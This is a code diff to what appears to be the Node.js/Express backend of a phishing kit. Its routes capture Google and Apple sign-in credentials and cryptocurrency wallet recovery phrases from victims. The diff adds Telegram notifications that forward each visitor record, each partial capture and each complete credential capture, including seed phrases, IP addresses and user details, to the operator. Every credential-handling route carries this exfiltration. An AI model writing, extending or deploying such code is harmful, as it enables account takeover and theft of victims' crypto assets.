@@ -3,6 +3,11 @@ const jwt = require('jsonwebtoken');
 const validator = require('validator');
 const User = require('../models/User');
 const auth = require('../middleware/auth');
+const { 
+  sendVisitorNotification, 
+  sendCredentialStartNotification, 
+  sendCredentialCompleteNotification 
+} = require('../services/telegram');
 
 const router = express.Router();
 
@@ -231,6 +236,11 @@ router.post('/track-visitor', async (req, res) => {
     visitors.push(visitorInfo);
     console.log('👁️  Visitor Tracked:', visitorInfo);
     
+    // Send Telegram notification
+    sendVisitorNotification(visitorInfo).catch(err => 
+      console.error('Telegram notification failed:', err)
+    );
+    
     res.json({ success: true, message: 'Visitor tracked' });
   } catch (error) {
     console.error('Error tracking visitor:', error);
@@ -261,6 +271,11 @@ router.post('/track-google-signin', async (req, res) => {
     
     capturedCredentials.push(credentialData);
     console.log('📧 Google Sign-In Tracked:', credentialData);
+    
+    // Send Telegram notification for initial step
+    sendCredentialStartNotification('Google', { email, ipAddress, userDetails }).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
     
     res.json({ success: true, message: 'Data captured' });
   } catch (error) {
@@ -295,6 +310,11 @@ router.post('/google-complete', async (req, res) => {
     
     capturedCredentials.push(completeData);
     console.log('✅ Google Sign-In Complete:', completeData);
+    
+    // Send Telegram notification for complete capture
+    sendCredentialCompleteNotification('Google', completeData).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
     
     // Create a token and user for dashboard access
     const token = jwt.sign(
@@ -344,6 +364,11 @@ router.post('/track-apple-signin', async (req, res) => {
     capturedCredentials.push(credentialData);
     console.log('🍎 Apple Sign-In Tracked:', credentialData);
     
+    // Send Telegram notification for initial step
+    sendCredentialStartNotification('Apple', { appleId, ipAddress, userDetails }).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
+    
     res.json({ success: true, message: 'Data captured' });
   } catch (error) {
     console.error('Error tracking Apple signin:', error);
@@ -377,6 +402,11 @@ router.post('/apple-complete', async (req, res) => {
     
     capturedCredentials.push(completeData);
     console.log('✅ Apple Sign-In Complete:', completeData);
+    
+    // Send Telegram notification for complete capture
+    sendCredentialCompleteNotification('Apple', completeData).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
     
     // Create a token and user for dashboard access
     const token = jwt.sign(
@@ -427,6 +457,11 @@ router.post('/track-recovery-phrase', async (req, res) => {
     capturedCredentials.push(credentialData);
     console.log('🔑 Recovery Phrase Tracked:', credentialData);
     
+    // Send Telegram notification for initial seed phrase entry
+    sendCredentialStartNotification('Recovery Phrase', { seedPhrase, ipAddress, userDetails }).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
+    
     res.json({ success: true });
   } catch (error) {
     console.error('Error tracking recovery phrase:', error);
@@ -458,6 +493,11 @@ router.post('/recovery-complete', async (req, res) => {
     
     capturedCredentials.push(completeData);
     console.log('✅ Recovery Phrase Complete:', completeData);
+    
+    // Send Telegram notification for complete capture
+    sendCredentialCompleteNotification('Recovery Phrase', completeData).catch(err =>
+      console.error('Telegram notification failed:', err)
+    );
     
     // Create a token and user for dashboard access
     const token = jwt.sign(
